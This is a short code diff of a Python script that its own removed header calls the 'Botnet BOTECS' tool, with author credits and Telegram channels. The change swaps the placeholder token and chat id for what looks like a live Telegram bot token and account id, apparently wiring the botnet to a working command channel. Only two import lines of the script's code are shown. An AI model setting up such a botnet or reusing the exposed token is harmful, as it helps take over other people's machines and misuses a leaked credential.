@@ -1,11 +1,5 @@
-#Botnet  BOTECS 
-# Link Project : https://github.com/esfelurm/botecs
-# writers : Esfelurm / Mr Root / Hydra
-# Broadcasting channel Telegram : @Team_Exploit
-# Tool Vip BotECS In channel : @KnightGuardian59
-
-token = ' Insert your bot token  '
-chat_id = 'Insert your account chat id ' 
+token = '6916243118:AAGQFFvrRnOEP57pu0-A4REiI6baja2OIzw'
+chat_id = '5887546516' 
 
 from os import system
 from platform import (system,platform)
